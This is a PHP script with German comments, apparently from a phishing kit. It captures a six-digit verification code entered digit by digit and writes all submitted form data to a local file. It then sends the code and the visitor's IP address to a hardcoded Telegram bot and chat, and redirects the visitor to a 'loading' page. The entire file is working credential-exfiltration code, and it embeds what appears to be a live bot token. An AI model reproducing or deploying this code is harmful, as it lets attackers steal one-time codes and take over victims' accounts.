<?php
// Debug: POST-Daten speichern, um zu prüfen
file_put_contents('debug.txt', print_r($_POST, true));

// Telegram Bot Daten
$botToken = '8774738162:AAG5wwzAn4uDk-31PZcYQxkwA3XDnEqIFjk';
$chatId = '-5227546407';
// Zusammensetzen des Codes
$code = '';
for ($i = 1; $i <= 6; $i++) {
    if (isset($_POST['digit' . $i])) {
        $digit = trim($_POST['digit' . $i]);
        if ($digit === '' || !is_numeric($digit)) {
            // Falls ein Feld leer oder kein Ziffer ist, abbrechen
            die('Ungültige Eingabe in Ziffer ' . $i);
        }
        $code .= $digit;
    } else {
        die('Fehlende Eingabe für Ziffer ' . $i);
    }
}

// Überprüfen, ob der Code 6 Ziffern hat
if (strlen($code) !== 6) {
    die('Der Code ist unvollständig: ' . $code);
}

// IP-Adresse des Nutzers
$ipAddress = $_SERVER['REMOTE_ADDR'];

// Nachricht an Telegram mit IP hinzufügen
$message = "Neuer 6-stelliger Code: " . $code . "\nIP: " . $ipAddress;

// Telegram API URL
$url = "https://api.telegram.org/bot$botToken/sendMessage";

// Daten für POST
$data = [
    'chat_id' => $chatId,
    'text' => $message,
];

// cURL-Anfrage
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
curl_close($ch);

// Optional: Response in debug.txt speichern
file_put_contents('response.txt', $response);

// Weiterleitung
header('Location: ../loading2.html');
exit;
?>